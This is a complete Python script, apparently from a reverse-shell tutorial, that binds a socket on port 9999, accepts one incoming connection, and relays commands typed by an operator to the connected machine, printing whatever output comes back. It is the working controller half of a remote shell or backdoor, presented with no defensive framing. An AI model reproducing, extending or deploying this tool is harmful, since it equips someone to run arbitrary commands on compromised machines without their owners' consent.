import socket
import sys
#create the socket 
def CreateSocket():
    try:
        global host
        global port
        global socketShell
        host = ''
        port = 9999
        socketShell = socket.socket()
    except socket.error as ErrorCreation:
        print("Socket Creation Error: {}".format(ErrorCreation))
#Bind the socket and wait for connection from client
def socket_bind():
    try:
        global host
        global port
        global socketShell
        print("Binding socket to port: {}".format(str(port)))
        socketShell.bind((host, port))
        socketShell.listen(5)
    except socket.error as BindError:
        print("Socket Bind Error:" + str(BindError) + "\n" + "Retrying..")
        socket_bind()
#Establish a connection with a client 
def socket_accept():
    conn, address = socketShell.accept()
    print("Connection has been established | " + "IP::" + address[0] + "| Port" + str(address[1]))
    send_commands(conn)
    conn.close()
#send commands
def send_commands(conn):
    while True:
        cmd = input()#everything we type in the terminal
        if cmd == "quit":
            conn.close()
            socketShell.close()
            sys.exit()
        #what we type on the terminal is bytes so, we need to encode and turn into strings
        if len(str.encode(cmd)) > 0:
            conn.send(str.encode(cmd))
            client_response = str(conn.recv(1024), "utf-8")
            print(client_response, end="") 
def main():
    CreateSocket()
    socket_bind()
    socket_accept()


main()


    
    
     